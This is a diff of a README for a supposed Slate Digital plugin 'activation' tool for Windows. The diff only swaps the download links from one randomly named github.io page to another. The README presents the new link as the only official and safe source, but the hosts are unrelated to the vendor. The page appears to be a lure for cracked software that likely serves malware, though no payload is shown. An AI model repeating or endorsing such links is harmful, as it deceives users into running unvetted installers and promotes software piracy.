@@ -2,7 +2,7 @@
 
 Slate Digital Plugins – This is the ultimate tool for managing and activating your Slate Digital audio plugins on Windows 10/11. Designed for music producers and audio engineers, it simplifies the activation process and keeps your plugins up to date. Experience seamless access to the full Slate Digital suite with just a few clicks, making your workflow more efficient and hassle-free.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -63,7 +63,7 @@ A: The tool is updated regularly to support new Slate Digital plugin releases an
 
 Get the latest version of the Slate Digital Plugins Manager from the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 **Note**: This is the only official source for downloading the tool. Avoid third-party websites to prevent security risks, corrupted files, or malware. Always download from our trusted page to ensure authenticity and safety.
 
